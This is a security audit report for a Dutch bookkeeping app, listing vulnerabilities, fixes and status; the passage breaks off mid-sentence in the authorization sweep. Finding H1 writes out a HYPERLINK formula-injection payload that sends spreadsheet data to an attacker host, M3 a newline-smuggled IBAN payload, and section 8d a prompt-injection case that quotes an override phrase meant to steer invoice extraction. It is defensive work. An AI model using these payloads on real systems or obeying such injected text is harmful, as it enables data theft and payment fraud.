# BoekBrug — Security & Correctness Hunt Report

Scope of this report: the multi-round adversarial hunt over the in-app file
system and its surrounding trust/lifecycle/ingestion surfaces. Each finding lists
**severity · lane · location · reproduction · impact · fix · status**.

- **Lane** — `MY-LANE` = the personal file manager (documents/folders/sharing/
  smart-views/search) and code that writes into it; `ADJACENT` = email/OAuth/
  invoicing/bank/deps that border it; `ACCOUNTANT-LANE` = closing-package /
  quarter package (owned separately on `main` — reported only, never edited here).
- **Status** — `FIXED (commit)` = already merged on `claude/in-app-file-system-ga6nu0`;
  `OPEN` = reported, awaiting a go / owner action.

Verification note: findings were produced by independent review agents and then
spot-verified against the real code. Line numbers are indicative.

---

## ⚑ Verification sweep — July 2026

**Every finding in this report was re-checked against the current code.** The
report had gone badly stale: **seven** findings still marked `OPEN` (H1, H3,
MH1, M2, M3, M4, M5) had in fact been fixed, some of them long ago. That is
itself a health risk — a report that cries wolf buries the one item that is
genuinely still outstanding, and sends attention to code that needs none.

### 🔴 NEW — D1: Next.js 16.2.6 middleware bypass (FIXED, July 2026)

Found by running a full `npm audit`, which this report had never covered — it
scoped the *application*, never the *framework*. Next.js 16.2.6 carried **nine**
advisories, all fixed in 16.2.11. The first outranks everything else in this
document:

> **"Middleware / Proxy bypass in App Router applications using Turbopack and
> single locale"** — HIGH, `>=16.0.0 <16.2.11`

BoekBrug builds with Turbopack, and `src/middleware.ts` is the **only**
authentication gate in the app: every `/dashboard/*` page, the onboarding
redirect and the billing paywall sit behind it. A bypass is unauthenticated
access to other people's bookkeeping — and no amount of hardening *inside* the
app matters if the gate can be walked around.

Also fixed by the same upgrade: SSRF in Server Actions on custom servers · SSRF
via attacker-controlled rewrite destinations · DoS in Server Actions · DoS in
the Image Optimization API via SVG · cache confusion of response bodies (×2) ·
unbounded Server Action payloads on Edge · unauthenticated disclosure of
internal Server Function endpoints.

**Fix:** `npm audit fix` → 16.2.12 (semver-compatible, lockfile only; NOT
`--force`). Verified: tsc clean, 105/105 test files, production build, middleware
still registers.

**Residual, deliberately not forced:** `next/node_modules/postcss` and
`next/node_modules/sharp@0.34.5` — Next's own nested copies, through which
`next` is now flagged only transitively. The sharp CVEs are libvips issues
reachable via Image Optimization; this app configures no `images.remotePatterns`
and uses `next/image` in two places, both rendering our own
`public/blog/*.png`. Our own sharp usage (`ai.ts`, downscaling invoice photos —
the path that *does* take untrusted input) dynamically imports the top-level
**sharp@0.35.3**, which is unaffected. postcss is build-time over our own CSS,
and the eslint/minimatch/brace-expansion cluster is devDependencies.

**Lesson worth keeping:** this report audited the code and never the supply
chain. `npm audit` belongs in the routine — the framework is part of the attack
surface.

---

Current true state:

| | Finding | State |
|---|---|---|
| 🟠 | **C1** SheetJS CVEs | **Contained, upgrade still outstanding** — prototype-pollution impact neutralised + ReDoS bounded (`xlsx-adapter.ts`, 15 tests). The one-command CDN upgrade is the only thing left, and it is the only thing that truly fixes CVE-2024-22363. **This is the single open item in this report.** |
| ✅ | H1 CSV formula injection | Fixed **+ 22 new regression tests** |
| ✅ | H2 sheet densification OOM | Fixed (`!ref` clamp) |
| ✅ | H3 CAMT non-finite amount | Fixed (`Number.isFinite`) |
| ✅ | MH1 OAuth state CSRF | Fixed (HttpOnly nonce cookie) |
| ✅ | M1 attachment ceiling | Fixed |
| ✅ | M2 e-mail HTML injection | Fixed (`escapeHtml` everywhere) |
| ✅ | M3 QR IBAN injection | Fixed **+ 25 new regression tests** |
| ✅ | M4 CAMT date drops batch | Fixed (`isValidIsoDate`) |
| ✅ | M5 CAMT entry-count ReDoS | Fixed (`MAX_CAMT_ENTRIES`) |

Two of the fixes were each a **single line with no test behind them** — and both
guard money: M3 stops a forged QR sending the owner's payment to an attacker's
IBAN, H1 stops a formula executing inside the accountant's spreadsheet. A fix
with no test is a fix waiting to be refactored away, so both now have dedicated
regression suites (`epc-qr.test.ts`, `csv-safe.test.ts`).

**Keep this table honest.** When a finding is fixed, mark it here in the same
commit — the cost of a stale report is paid later, by whoever trusts it.

---

## 0. Already fixed this session (for context)

| Area | What | Commit |
|---|---|---|
| Sharing/period | `[FIN-QUARTER]` share preserves the file's quarter; bankafschrift not re-stamped; explicit un-share wins | earlier |
| Sharing cleanup | `[FIN-UNIFY]` retired dead path-based sharing (single `shared`-flag definition) | earlier |
| Folder placement | `[I#1]` upload persists `folder_id` (was silently root) | e3dd7bd |
| Folder integrity | `[Fo#1]` no folder cycles · `[Fo#2]` reserved system-folder names · `[Fo#3]` deleteFolder error checks · `[Fo#5]` moveFolder system guard · `[Fo#6]` folders-tree fields | e3dd7bd / 21499da |
| Trashed leaks | `[T#3]` global search · `[T#4]` bank statements list | e3dd7bd / 21499da |
| Delete safety | `[I#2]` deleteDocument row-first + checked · `onboarding/reset` same order | e3dd7bd / a3c8321 |
| Trash honesty | Removed fake permanent-delete / "30-day" promise (7-yr retention) | bc43aa0 |
| Classify | `[I#4]` bank-detection word-bounded, no invoice override | 21499da |
| Frontend robustness | `[F#1–F#8]` signed-URL cache/dedupe/cap, cancel guards, input reset, etc. | 21499da |
| **Accountant linking** | **`[SEC-LINK]` dropped the unconsented-self-link INSERT policy; unlink multi-row; subject-status trashed** | 4216a43 |
| **Accountant read RLS** | **`[SEC-DOCS-RLS]` versioned `documents_accountant_read` (was prod-only)** | 139a7be |

---

## 1. CRITICAL

### C1 — `xlsx@0.18.5` has known CVEs, reachable server-side on untrusted uploads
- **Lane:** ADJACENT (parser shared by bank/turnover/intake) · **Status:** ⚠️ **MITIGATED — upgrade still required** (July 2026)

> **Update — July 2026.** Containment shipped in `src/lib/xlsx-adapter.ts`
> (`withPrototypeGuard` + `assertWithinParseLimit`, 15 tests in
> `xlsx-adapter.test.ts`). The adapter is the ONE module importing SheetJS and
> every one of the six upload paths funnels through `sheetBytesToMatrix`, so the
> guard covers the whole attack surface. All six callers already wrap the call
> in `try/catch`, so a refused file degrades to a clean 422 / skip — never a 500.
>
> - **CVE-2023-30533 (prototype pollution) — impact contained.** Any property
>   the parse leaves on `Object`/`Array`/`Function.prototype` is detected,
>   deleted, and the upload rejected. The check runs in a `finally`, so it also
>   fires when the parse *threw* — the realistic attack shape is "poison, then
>   crash", where the caller's `try/catch` would otherwise swallow the crash and
>   leave the process silently corrupted for every later request.
> - **CVE-2024-22363 (ReDoS) — bounded, NOT fixed.** The CPU burn is inside a
>   synchronous `XLSX.read` that nothing in-process can interrupt. A 20MB
>   backstop ceiling (above the routes' own 10MB cap, so it never rejects a file
>   they accepted) limits the work one upload can demand. **Only the upgrade
>   actually fixes this.**
>
> **The upgrade is still outstanding and is one command**, to be run from an
> environment that can reach `cdn.sheetjs.com` (it was blocked by egress policy
> in the session that shipped the containment):
>
> ```bash
> npm install https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz
> npm audit            # expect: no xlsx advisories
> npx tsc --noEmit && npx tsx --test src/lib/*.test.ts && npm run build
> ```
>
> Then upload one real Z-report, one grootboek export and one bank `.xlsx` to
> confirm parsing is unchanged. `package.json` was deliberately NOT pointed at
> the CDN tarball without being able to install and test it — an unverifiable
> dependency change would risk breaking every build. Keep the guards after the
> upgrade: they are defence in depth and cost nothing.
- **Location:** `package.json` (`"xlsx": "^0.18.5"`); `src/lib/xlsx-adapter.ts:13` (`XLSX.read`); reached from `src/app/api/turnover/import/route.ts` (10MB), `src/app/api/bank/upload` + `src/app/api/intake` bank branch via `src/lib/bank-ingest.ts:60` (`detectSheetKind(sheetBytesToMatrix(...))` for any ZIP/OLE2-magic upload).
- **Repro:** upload a crafted `.xlsx`: (a) a `__proto__`-poisoning cell/defined-name → **CVE-2023-30533** prototype pollution corrupts `Object.prototype` for the whole Node process; (b) a ReDoS-triggering cell → **CVE-2024-22363** CPU exhaustion. The endpoint `try/catch` does not stop pollution side-effects or CPU burn.
- **Impact:** server-wide logic corruption / DoS from a single authenticated upload.
- **Fix:** upgrade to SheetJS **≥ 0.20.2**. The npm registry is frozen at 0.18.5 (SheetJS moved to their own CDN), so this is a dependency-source change: point `xlsx` at the SheetJS CDN tarball (`https://cdn.sheetjs.com/xlsx-0.20.x/xlsx-0.20.x.tgz`) in `package.json` and reinstall. Needs a build test; affects bank/turnover parsing.

---

## 2. HIGH

### H1 — CSV formula injection in the invoice CSV builders  ✅ verified
- **Lane:** ADJACENT (invoice export + GDPR export) · **Status:** ✅ **FIXED + REGRESSION-TESTED** (verified July 2026) — the shared neutraliser lives at `src/lib/csv-safe.ts` (`csvCell`) and both builders in `export.ts` use it (`:189`, `:247`), as does `closing-package.ts`. The GDPR `facturen.csv` is covered transitively: `account-export.ts` calls `invoicesToCsv`. 22 tests in `csv-safe.test.ts`, incl. the `=HYPERLINK` exfiltration payload and the apostrophe-inside-the-quotes ordering.
- **Location:** `src/lib/export.ts:181` (`invoicesToCsv`) and `:242` (`invoicesToCsvAccountant`) — the `escape()` only RFC-4180-quotes `;`/`\n`/`"`, it does **not** neutralise formula leads `= + - @`. Consumers: `src/app/api/export/route.ts:164` (accountant "all clients"), `:225` (single user), `src/lib/account-export.ts:88` (GDPR `facturen.csv`).
- **Repro:** create an invoice with `client_name = =HYPERLINK("https://attacker.example/"&A1,"OK")`; accountant runs `GET /api/export?accountant=true&year=2026`; opening the CSV in Excel executes the formula.
- **Impact:** formula/command execution in a third party's (accountant's) spreadsheet; data exfiltration via HYPERLINK.
- **Fix:** route every cell through a `csvCell`-style neutraliser — the model already exists at `src/app/api/kluis/export/route.ts:27` (`if (/^[=+\-@\t\r]/.test(s)) s = "'" + s`). `bank-csv.ts:389` also already does this — export.ts is the gap.

### H2 — SheetJS matrix densification → OOM from a tiny file
- **Lane:** ADJACENT (parser) · **Status:** ✅ **FIXED** — the report was stale. `src/lib/xlsx-adapter.ts` clamps the declared `!ref` range to 100 000 × 200 before `sheet_to_json`, so a `<dimension ref="A1:XFD1048576"/>` file can no longer force the densification. Verified in code July 2026 while shipping the C1 containment.
- **Location:** `src/lib/xlsx-adapter.ts:17` `sheet_to_json(sheet, { header:1, defval:null, blankrows:false })`.
- **Repro:** a ~10KB `.xlsx` declaring `<dimension ref="A1:XFD1048576"/>` (16384×1048576) with two real cells → `sheet_to_json` iterates the whole declared range, allocating per cell → multi-GB transient allocation → **server OOM** (not caught by `try/catch`; kills the process, crashing the shared upload path).
- **Fix:** bound the `!ref` rows×cols (and/or a decompressed-size guard) before `sheet_to_json`; reject oversized ranges with a clear error.

### H3 — CAMT.053 amount has no finite/NaN guard → financial corruption
- **Lane:** ACCOUNTANT/BANK · **Status:** ✅ **FIXED** (verified July 2026) — `bank-parser.ts` guards with `Number.isFinite(rawAmount)` and drops the single entry with a Dutch error instead of writing a corrupt figure. Covered in `bank-parser.test.ts`.
- **Location:** `src/lib/bank-parser.ts:528` `parseFloat(amtMatch[2])`; flows to `bank-import.ts:172` → `bank-ingest.ts:97` insert with no `Number.isFinite` check.
- **Repro:** a CAMT file with `<Amt Ccy="EUR">1e309</Amt>` (→ Infinity) or `<Amt Ccy="EUR">abc</Amt>` (→ NaN) writes non-finite into `bank_transactions.amount`, poisoning every downstream sum (reconciliation, quarter totals).
- **Fix:** `if (!Number.isFinite(rawAmount)) { errors.push(...); return null; }` (MT940/CSV/EFT already guard).

---

## 3. MEDIUM-HIGH

### MH1 — OAuth `state` is forgeable → mailbox-connection CSRF
- **Lane:** ADJACENT (email OAuth; the writes it enables land in MY-LANE) · **Status:** ✅ **FIXED** (verified July 2026) — `src/lib/oauth-state.ts` mints a random nonce, stores `{nonce,userId,provider}` in an HttpOnly cookie, and the callbacks take the userId from the COOKIE, never from the URL. Wired into `connect` + both callbacks. Tested in `oauth-state.test.ts`.
- **Location:** `src/app/api/email/connect/route.ts:30` builds `state = base64({userId, provider})` (no random nonce); `src/app/api/email/callback/gmail/route.ts:49` (and outlook `:42`) does `const userId = user?.id ?? stateData.userId` — trusts the forgeable state when no session.
- **Repro:** attacker obtains a valid OAuth `code` for the attacker's own mailbox, then triggers `/api/email/callback/gmail?code=<attacker_code>&state=base64({"userId":"<victim>","provider":"gmail"})` with no BoekBrug session → the attacker's mailbox tokens are linked into the victim's `email_connections`; the victim's next sync ingests the attacker's emails, creating documents/invoices in the victim's account.
- **Impact:** inject arbitrary content into a victim's file manager / verify queue (needs the victim's UUID, which leaks).
- **Fix:** random state nonce stored in an HttpOnly cookie (or server-side), verified on callback; never fall back to `stateData.userId`.

---

## 4. MEDIUM

### M1 — Email attachment pipeline enforces no size/type ceiling
- **Lane:** MY-LANE (writes documents) · **Status:** FIXED (`isLikelyInvoiceCandidate` upper cap drops known-oversized before fetch; a byte-length guard in the PHASE-2 upload loop registers the provider-unknown case as a skip — 10 MB cap, `MAX_EMAIL_ATTACHMENT_BYTES`)
- **Location:** `src/lib/email-integration.ts:1746`,`:2002` upload raw `fileBuffer`; `classifyAttachment` (`:1615`) sends it to Claude — no byte cap (manual upload caps 10MB at `email/upload/route.ts:47`).
- **Repro:** anyone emails the owner large PDFs → stored in the owner's bucket + a Claude call each → unbounded storage growth + AI spend from untrusted inbound mail.
- **Fix:** enforce the same per-file byte cap (+ a per-sync aggregate cap) before Storage upload / AI classification.

### M2 — Email HTML injection in Resend templates
- **Lane:** ADJACENT (email) · **Status:** ✅ **FIXED** (verified July 2026) — `escapeHtml` (`email.ts:49`) is applied to every interpolated user string across all templates (invite, invoice, message, unlink, reminder); the message body additionally goes through `safeBody` (`:327`). The remaining raw interpolations are app-built URLs, number/date formatters and internal constants.
- **Location:** `src/lib/email.ts` — user free-text interpolated raw into `html`: `sendMessageNotification` (`:198`, message body → recipient), `sendInvoiceToClient` (`:139`, clientName/invoiceNumber → customer), invite/unlink templates (names). `sendDraftQueueEmail` (`:285`) already escapes correctly — use it as the model.
- **Impact:** phishing links / spoofed content / hidden text in mail to a third party (scripts are stripped by clients, so no XSS).
- **Fix:** apply the existing `escape()` helper to every interpolated user string.

### M3 — EPC/SEPA QR `name` field not newline-stripped → QR IBAN injection
- **Lane:** ADJACENT (payments) · **Status:** ✅ **FIXED + REGRESSION-TESTED** (verified July 2026) — `epc-qr.ts` strips CR/LF from the beneficiary name before it reaches line 6, exactly as the remittance line already did. 25 tests in `epc-qr.test.ts` pin the property that matters: **line 7 stays the real IBAN** under `\n`, `\r\n` and lone-`\r` payloads, and the block stays 12 lines. Highest-consequence item in this report — it is money leaving the company — so it is the most heavily tested.
- **Location:** `src/lib/epc-qr.ts:91` `name = (input.name ?? '').trim().slice(0,70)` — not stripped of CR/LF, while `reference` two lines down **is** (`:103`). Exploit path: `src/app/dashboard/incoming/manage/IncomingManageClient.tsx:907` passes `name = inv.client_name` (supplier name, OCR/attacker-controlled) into the EPC payload.
- **Repro:** vendor name `"Legit BV\nNL91ABNA0417164300"` injects an attacker IBAN into the line-7 (IBAN) position of the QR the owner scans, while the on-screen IBAN still shows the real one.
- **Fix:** strip CR/LF from `name` exactly as `reference` already does.

### M4 — CAMT.053 malformed `<ValDt>` drops the whole batch (false-green)
- **Lane:** BANK · **Status:** ✅ **FIXED** (verified July 2026) — `isValidIsoDate` (`bank-parser.ts:607`) is a real calendar check and is called at `:657`; a bad entry is dropped with a warning instead of failing the batch insert.
- **Location:** `src/lib/bank-parser.ts:539` takes the date verbatim; a single `<Dt>9999-99-99</Dt>` fails the batch insert (`bank-ingest.ts:97`), which only sets `inserted` on `!error` and swallows the failure → all transactions silently dropped, file still stored ("verwerkt", 0 inserted).
- **Fix:** validate the CAMT date shape; drop the single bad entry, not the batch; surface a warning.

### M5 — CAMT ReDoS / O(n²) tag scanning
- **Lane:** BANK · **Status:** ✅ **FIXED** (verified July 2026) — `MAX_CAMT_ENTRIES = 50000` bounds the `<Ntry>` scan; on reaching it the parser stops and reports rather than parsing an abusive file to completion.
- **Location:** `bank-parser.ts:497` `/<Ntry>([\s\S]*?)<\/Ntry>/g`, `:547` `/<TxDtls>([\s\S]*?)<\/TxDtls>/`. Hundreds of thousands of unclosed `<Ntry>` within the 5–10MB cap → seconds-to-minutes of single-threaded CPU per request.
- **Fix:** bound entry count / use a streaming XML parser.

---

## 5. LOW

- **L1 — turnover `num()` silent NaN→0 + sign loss** — `src/lib/turnover-import.ts:34,:154`: an unparseable `Omzet incl.` cell becomes `0` and the day is `continue`d with no per-row warning; a parenthesised negative `(1.234,56)` loses its sign. Financial under-statement, mitigated by the human preview. *(BANK lane, report-only.)*
- **L2 — intake `ilike` wildcard from parsed vendor** — *FIXED.* Added `escapeLikeValue()` to `src/lib/sanitize.ts` (neutralises `\ % _` for direct `.ilike(col, val)` calls, without the `,()` escaping that would corrupt a bound value) and applied it at `src/app/api/intake/route.ts:194` and the sister site `src/lib/email-integration.ts` (invoice dedup, which the comment already intended as a literal match). *(MY-LANE.)*
- **L3 — UBL unescaped XML (dead code)** — `src/lib/export.ts:394` interpolates `invoice_number`/date without `escapeXml`; `invoicesToUbl` is **not wired to any route** (the live route uses `ubl-export.ts` via `xmlbuilder2`, which escapes correctly). Flag before anyone wires it up.
- **L4 — signed-URL 1h window after unlink** — `src/app/dashboard/brug/page.tsx:112` signs at 3600s; RLS revocation is immediate, but an already-issued URL stays valid up to 1h. Consider a shorter TTL for the accountant view.
- **L5 — rate-limit fails open** — `src/lib/rate-limit.ts:81` returns `{ allowed: true }` on RPC error (cost/DoS exposure on AI/OCR/email-sync, not access control). Deliberate; flagging.
- **L6 — OAuth error bodies logged** — `email-integration.ts:376`,`callback/outlook/route.ts:63` log provider *error* bodies (not tokens); tighten before prod.

---

## 6. Open lifecycle / audit items (prior security round)

- **A1 — Account "deletion" never reclaims storage/rows; retention timer has no consumer.** `api/account/delete` bans the user + sets `data_eligible_for_deletion_at = now+7y`, but `isEligibleForDeletion` (`src/lib/retention.ts:50`) has **no caller** and there is **no purge cron** — a deleted account's `documents` rows and every Storage object persist forever; GDPR erasure never executes. *Product/compliance decision (like the trash purge): build a retention-purge cron that consumes the timer, or state the policy explicitly.*
- **A2 — FK cascade orphans Storage on a hard delete.** *Accepted / deferred by design.* `documents.user_id`/`folders.user_id` are `ON DELETE CASCADE` to `profiles`→`auth.users`, but Storage objects have no DB trigger — an admin `auth.admin.deleteUser` / dashboard hard-delete cascades the rows and orphans every object. **Not fixable with a SQL trigger:** deleting `storage.objects` rows removes only the metadata and would leave the physical files orphaned in the backend — the correct removal path is the Storage API (service_role). No app route hard-deletes a user (normal deletion is a ban, A1), so this only triggers on a manual admin action. *Correct fix = a periodic orphan-sweep job that lists bucket objects with no matching `documents` row and removes them via the Storage API; deferred as ops tooling.*
- **A3 — `documents.shared` column + Storage bucket policies still prod-only.** *FIXED.* `[SEC-DOCS-DRIFT]` `supabase/migrations/documents_shared_and_storage_policies.sql` versions the `documents.shared` + `content_hash` columns (idempotent `ADD COLUMN IF NOT EXISTS`) and the three owner-scoped `storage.objects` policies (`documents_upload/read/delete`, previously SECTION-8 comments only). Companion to `[SEC-DOCS-RLS]`. Header notes: diff the storage policies against live before deploy.
- **A4 — content_hash dedup TOCTOU** (`[I#3]`/email `#3`) — *Accepted low-risk.* Concurrent uploads/syncs of identical bytes can create duplicate rows (dedup is app-level `select-then-insert`). A UNIQUE `(user_id, content_hash)` index is **the wrong fix** — it would break the intentional `allowDuplicate` "upload again" feature that deliberately creates a second row with the same hash. Within a single sync run PHASE 2 is sequential (safe); the residual is only two *overlapping* runs. Mitigate with a per-user sync advisory lock if it is ever observed. (A non-unique `(user_id, content_hash)` index was added in `[SEC-DOCS-DRIFT]` to speed the dedup lookups — it does not enforce uniqueness.)

---

## 7. Verified SOUND (no action — reassurance)

- **File-manager API:** no IDOR — every read/write is double-scoped (owner RLS + explicit `.eq("user_id", …)`); folder move validates ownership + blocks cycles.
- **Dual-path accountant authz** (closing-package, result, email/file, subject-status): each re-verifies the `accountant_clients` link **before** any service_role work.
- **Invitation tokens:** `gen_random_uuid`, UNIQUE, single-use, 14-day expiry, `auth.email()` match on accept (hijack closed).
- **Unlink revocation is live** via `is_my_accountant_client()` (no cached grant); storage keys are always owner-prefixed + sanitised (no traversal).
- **Cron auth** fails closed (`CRON_SECRET` bearer); **Vault** token RPCs are `SECURITY DEFINER`, revoked from public/authenticated, never returned to clients.
- **No SSRF** — every pipeline `fetch` targets a hardcoded host; email links/images never dereferenced.
- **Auto-invoice from email** inserts `status='processing'`; `invoices.shared` is a GENERATED column (`status IN sent/received/paid`) → email imports are never accountant-visible without human confirm; email documents never set `shared`.
- **Public pay page/token** (`/pay/[token]`): UUID-gated, rate-limited, projected through a tight allowlist (`toPublicPayView`) — no cross-invoice/PII leak; renders as React text.
- **CSV formula injection neutralised** in `kluis/export` (`csvCell`) and `bank-csv` (`toNormalizedCsv`); **invoice PDF** (`@react-pdf`) escapes; **UBL live route** escapes via `xmlbuilder2`; **unpdf** path is fail-safe.
- **Prototype pollution in app code** guarded (MT940 keys `[A-Z]{2,4}`; fixed literal keys elsewhere) — the residual risk is inside SheetJS itself (**C1**).
- **Export/delete/reset** are strictly session-scoped — no cross-user leak or IDOR.

---

## 8b. Q2-2026 financial-correctness hunt (BTW / aangifte / reconciliation)

Run specifically because Q2 numbers are about to go to the accountant. **Headline
reassurance: the core engine is arithmetically SOUND** — `computeResult → buildAangifte
→ /api/aangifte, /api/result, closing-package ZIP` rounds correctly (per-rubriek round-
once, no `toFixed`-for-math), quarters Q2 = Apr 1–Jun 30 inclusive, subtracts
voorbelasting with the right sign, and applies consistent status filters. The wrong
numbers below live in **summary UIs that bypass that engine** + the **bank auto-match
gate** — not in the aangifte itself. All REPORT-ONLY (accounting lane).

### 🔴 QF1 — `/dashboard/quarterly` "BTW aangifte" panel ADDS voorbelasting instead of subtracting
`src/lib/quarterly.ts:153-170` (`buildQuarterlySummary` does `totalBtw += btw` for **both**
directions) → `src/components/quarterly/QuarterlyOverview.tsx:513-534`, fed by `/api/quarterly`
accountant mode. Worked example (Q2): sales €10.000@21% (€2.100 BTW) + purchases €4.000@21%
(€840 BTW) → panel shows **Totaal BTW €2.940** and "omzet €14.000"; correct aangifte is
5a €2.100 − 5b €840 = **5g €1.260**. Overstated by €1.680 (2× voorbelasting) and mixes
purchase costs into turnover. **Accountant-facing, labelled "BTW aangifte" — fix before
anyone reads a total off this panel.** (The real aangifte via `/api/aangifte` is correct.)

### 🔴 QF2 — per-client quarter tiles always show €0,00
`src/app/dashboard/clients/[id]/kwartaal/page.tsx:169-177` reads `pnl.omzet` / `pnl.kosten`
/ `btw.saldo`, but `/api/result` nests under `result` and `/api/aangifte` under `aangifte`.
`Number(undefined)||0 = 0` → every client, every quarter shows **€ 0,00** for Omzet /
Kosten / BTW te betalen. Fix: read `pnl.result.omzet`, `pnl.result.kosten`,
`btw.aangifte.saldo`.

### 🔴 QF3 — bank reference match marks an invoice fully paid regardless of amount
`src/lib/bank-matching.ts:276-283` gives a reference-number match `confidence 0.9` **even
when the amount doesn't match**, ≥ the 0.7 auto threshold → pre-selected "betaald"; and
`confirm/route.ts:123` re-checks eligibility with `total_inc_btw: null`, so **no amount
reconciliation happens on the paid-flip path**. Repro: a €50 deposit referencing invoice
`2026-014` (€500) → one click marks the €500 invoice `paid`. Wrong "paid" → wrong BTW
booked as settled → wrong quarter. Fix: gate `auto` on `amtOk` (mismatch ⇒ `choice`, not
`auto`) and compare `tx.amount` vs `total_inc_btw` in confirm (the `attach-invoice` route
already models `AMOUNT_TOLERANCE`).

### 🟠 QF4 — one transfer marks multiple invoices paid by presence, no sum tie-out
`bank-matching.ts:466-473` + `confirm/route.ts:160-202`: multi-invoice coverage is a
presence check with "no amount arithmetic". A €100 transfer referencing two €100 invoices
can mark both paid (€200 settled by €100). Human-confirmed, but no divergence warning.

### 🟠 QF5 — Dutch thousands without decimals parsed 1000× too small (turnover & EFT)
`src/lib/turnover-import.ts:34-44` and `src/lib/eft-parser.ts:47-56`: `num("2.500")` → **2.5**
(strips grouping dots only when a comma is present). A Z-report/EFT whole-euro value like
`2.500` imports as €2,50; if the whole row scales the same way the net+btw≈gross cross-check
still passes → silently understated omzet + BTW. Fix: reuse `bank-csv.parseBankAmount` /
`parse-nl.parseAmountNL`, which handle `d.ddd` (no comma) as thousands correctly.

### 🟡 Lower
- **QF6** mixed-rate outgoing invoice → whole invoice bucketed to rubriek 1c via a blended
  header rate (`financial-result.ts:168`); **5a total is preserved**, only the 1a/1b/1c
  split is wrong. `src/lib/export.ts:322-372` `calcBtwSummary`/`renderBtwAangiftePdf` have a
  worse version (buckets any rate into 21%, no direction filter) but are **unwired/dead** —
  flag before rewiring.
- **QF7** attach-invoice double-count if two different files are attached to ONE payment
  (`bank/attach-invoice/route.ts:225-297`) — user-error-triggered, no warning; the route is
  otherwise careful (rolls back stored file+row on failure).
- **QF8** `getQuarter`/`quarterEndDate` use local-time `new Date()` (`quarterly.ts:63-73`) —
  fine on a UTC server, pin the server TZ to be safe. Not on the aangifte path.

**Verified sound (money side):** comma-decimal parsing in the live bank paths, cents-vs-euro
consistency (no stray ×100/÷100), one-to-one match guard, sign/direction + date-sanity
guards, trashed/archived excluded from totals, server recomputes legal invoice totals before
PDF/email. No `float === float` deciding "paid".

**Before submitting Q2:** trust `/api/aangifte` + the closing-package ZIP (sound); do NOT read
totals off `/dashboard/quarterly` (QF1) or the per-client tiles (QF2) until fixed; and
re-verify any invoice auto-marked "paid" from a bank reference (QF3) actually matches on amount.

## 8c. Client-state fixes (Mijn bestanden UI — MY-LANE, FIXED)

Fire-and-forget mutations in `BestandenPage.tsx` — every write was optimistic with no
`res.ok` check. **FIXED** (commit e990314): share/rename/delete/move/star/createFolder and
all four bulk actions now update state only on success (a failed share no longer claims the
accountant can see the doc); `loadContents` + search got sequence/cancel guards (no wrong-
folder contents from a fast A→B nav); createFolder, bulk actions and the FAB uploader got
double-submit guards. Money screens `IncomingInvoicesClient` (optimistic remove on failed
pay) and `FacturenClient.executeDelete` (swallows failure) have the same class — REPORT-ONLY,
their lane; `FacturenClient.executePay/executeSend` and `BankClient` already roll back correctly.

## 8d. AI layer — prompt injection & output validation

Untrusted document text + **filename** are sent to Claude for extraction/classification;
the output drives filing + invoice rows. **Reassurance: no AI decision auto-applies** —
every AI write lands `status:'processing'` (human verify queue), and no hallucinated
id reaches a cross-user query (folderId is server-resolved + user-scoped; vendor strings
go through `escapeLikeValue`). The gaps are about *what a human is asked to rubber-stamp*.

- **✅ AF-CLASSIFY — FIXED (MY-LANE, commit pending):** `bestanden/classify/route.ts` called
  `classifyDocument(doc.file_name, doc.file_type)` but the signature is `(fileContent, fileName)`
  — the MIME type was passed as the filename and the model classified off `"application/pdf"`,
  never the real name. Corrected to pass the filename in the fileName slot (this route makes a
  filename-only folder *suggestion*; it doesn't fetch content).
- **🟠 AF1 [REPORT] prompt injection — no data/instruction fencing.** `ai.ts:927-963`: filename
  and extracted PDF text are string-interpolated raw (only a cosmetic `--- FACTUUR TEKST ---`
  divider). A crafted invoice/filename ("negeer instructies, antwoord {…negative totals…}") can
  steer amount/type/vendor. Mitigated by the processing-queue, but the health badge still reads
  "clean" so the human likely confirms. Fix: fence untrusted content as explicit data.
- **🟠 AF2 [REPORT] no magnitude cap on amounts.** `ai.ts:1167` + `safecore.ts:77-157` check only
  `finite && >= 0` and the `ex+btw=incl` identity — an injected `9_999_999_999` with a consistent
  split passes with no hold flag. Add a sane upper bound.
- **🟠 AF3 [REPORT] AI-controlled `is_credit_note` unlocks large negative totals** (`ai.ts:1135,1175`)
  → a phantom credit note offsetting real payable/voorbelasting, arithmetically "clean".
- **🟡 AF4 [REPORT] `invoice_date` persisted without a range clamp** (`intake/route.ts:400`,
  `email-integration.ts:2026`) — `"0219-03-01"` saves (soft-flag only); `documents.year` → 219.
- **🟡 AF5 [REPORT] cost/DoS:** `extractedText` sent uncapped + a 2nd full raw-PDF call when the
  cheap path is inconclusive (`ai.ts:960-1003`) — crafted text forces 2× spend. Bounded by the
  10 MB cap + rate limits. Fix: slice the text.

## 8e. Invoice numbering & status machine (REPORT-ONLY, invoicing lane)

**Reassurance: the numbering race is genuinely closed** — `next_invoice_seq()` is an atomic
`INSERT … ON CONFLICT DO UPDATE … RETURNING`, there's a `UNIQUE(sender_id, invoice_number)`
backstop, and send is a compare-and-swap (`.eq('status','draft')`, one-row-affected) so a
double-click can't double-number or double-email. Numbers are assigned at SEND, not create.

- **🔴 IN1 duplicate credit notes (TOCTOU, legal).** `invoice/creditnota/route.ts:89-117` checks
  "creditnota exists?" then inserts, with **no unique constraint on `original_invoice_id`** — two
  clicks credit the same invoice twice (distinct valid numbers, so nothing flags it) → VAT/revenue
  understated 2×. Fix: partial `UNIQUE (sender_id, invoice_type, original_invoice_id) WHERE
  invoice_type='creditnota'` + catch 23505.
- **🟠 IN2 status transitions not server-enforced.** `FacturenClient.tsx:172-193` writes `status`
  with no `.eq('status', …)` precondition — a crafted request can flip any owned invoice draft→paid
  or paid→sent. (overdue is computed, not stored — no paid+overdue conflict.) Add a server-side
  transition guard.
- **🟡 IN3 sequence gaps** on a post-allocation failure (number minted, insert/update fails) — logged,
  legally explainable, inherent to app-level alloc without a wrapping txn. The migration's claim
  "the lib retries on 23505" is **false** (`invoice-numbering.ts` does a single attempt).
- **🟡 IN4** `draft_queue` send can double-fire the reminder email (no idempotency) — low (no invoice).
- **ℹ️ IN5** dead `generate_invoice_number` (`count(*)+1`, racy) still in the `database.sql` snapshot
  (dropped in the migration) — confirm it's gone in prod. **IN6** re-seed regex is format-stale
  (dash format) — never re-run the seed post-FACTUUR-UNIFY.

## 8f. Authorization sweep — all 78 API routes (CLEAN)

Exhaustive per-route audit (auth ✓ / ownership ✓ / mass-assignment ✓). **No unauthenticated
mutation, no IDOR, no exposed admin/debug endpoint.** Every service-role write is preceded by an
ownership or accountant-link check; every PATCH uses an explicit field allowlist (no body spread —
